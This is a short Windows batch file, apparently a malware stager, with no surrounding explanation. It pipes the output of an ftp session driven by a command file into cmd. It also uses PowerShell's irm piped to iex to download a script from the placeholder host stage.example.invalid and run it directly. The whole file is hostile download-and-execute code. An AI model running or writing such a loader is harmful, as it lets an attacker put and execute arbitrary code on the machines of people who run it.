@echo off
ftp -n -s:commands.txt | cmd
powershell -NoProfile -Command "irm 'https://stage.example.invalid/code.ps1' | iex"
